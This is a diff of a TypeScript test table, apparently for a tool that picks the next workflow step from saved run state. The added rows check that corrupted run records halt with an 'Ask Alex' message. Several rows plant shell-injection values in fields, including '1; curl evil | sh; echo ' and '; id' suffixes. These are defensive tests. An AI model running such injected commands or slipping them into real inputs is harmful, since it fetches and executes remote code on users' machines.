@@ -27,6 +27,7 @@ const BASE: Snapshot = {
   pr: null,
 };
 const snap = (over: Partial<Snapshot>): Snapshot => ({ ...BASE, ...over });
+const planted = (run: object): Snapshot => snap({ state: { ...BASE.state!, runs: [{ ...RUN, ...run }] } });
 const open = { number: 9, state: "OPEN" } as const;
 const unended = snap({ running: true, state: { ...BASE.state!, runs: [{ ...RUN, ended: null }] } });
 
@@ -48,6 +49,16 @@ const ROWS: readonly [row: number, over: Snapshot, id: StepId, needle: string, a
   [10, snap({ pr: { number: 9, state: "MERGED" }, treeHead: "b" }), "retire", "git -C /r worktree remove --force"],
   [11, snap({ pr: { number: 9, state: "CLOSED" } }), "closed", "closed without merging"],
   [12, snap({ treeHead: "b" }), "push", "npm run handoff -- next 1500 again"],
+  [26, planted({ n: "1; curl evil | sh; echo " as never }), "stopped", "Ask Alex", "curl"],
+  [27, planted({ n: 2 }), "stopped", "Ask Alex", "run-2"],
+  [28, planted({ kind: "x; id" as never }), "stopped", "Ask Alex", "x; id"],
+  [29, planted({ exit: "1; id" as never }), "stopped", "Ask Alex", "1; id"],
+  [30, planted({ ended: "yesterday; id" }), "stopped", "Ask Alex", "yesterday"],
+  [31, planted({ started: "x" }), "stopped", "Ask Alex", "Run 1"],
+  [32, planted({ pid: 1 }), "stopped", "Ask Alex", "Run 1"],
+  [33, planted({ pid: 0 }), "stopped", "Ask Alex", "Run 1"],
+  [34, planted({ pid: 1.5 }), "stopped", "Ask Alex", "Run 1"],
+  [25, snap({ state: { ...BASE.state!, runs: [] } }), "stopped", "Ask Alex"],
   [
     24,
     snap({ treeHead: "b" }),
